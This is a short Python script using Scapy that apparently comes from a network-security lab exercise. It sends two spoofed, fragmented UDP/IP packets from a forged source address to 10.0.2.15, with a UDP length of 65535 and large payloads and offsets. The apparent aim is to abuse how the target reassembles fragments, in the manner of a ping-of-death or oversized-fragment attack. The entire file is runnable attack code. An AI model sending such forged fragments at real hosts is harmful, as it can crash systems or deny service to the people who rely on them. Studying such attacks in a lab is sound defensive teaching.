#!/usr/bin/python3
from scapy.all import *

# Scapy Spoofing

ID = 1001
len1 = 40
len2 = 46000
len3 = 3200
## First Fragment

payload = "A" * len1

udp = UDP(sport=7070, dport=9090)
udp.len = 65535
ip = IP(src="1.2.3.4", dst="10.0.2.15") 
ip.id = ID
ip.frag = 0
ip.flags = 1
pkt1 = ip/udp/payload
pkt1[UDP].chksum = 0

## Second Fragment

payload = "B" * len2

ip.frag = 201
ip.flags = 1
ip.proto = 17
pkt2 = ip/payload


send(pkt1,verbose=0)
send(pkt2,verbose=0)
print("Finish Sending Packets!")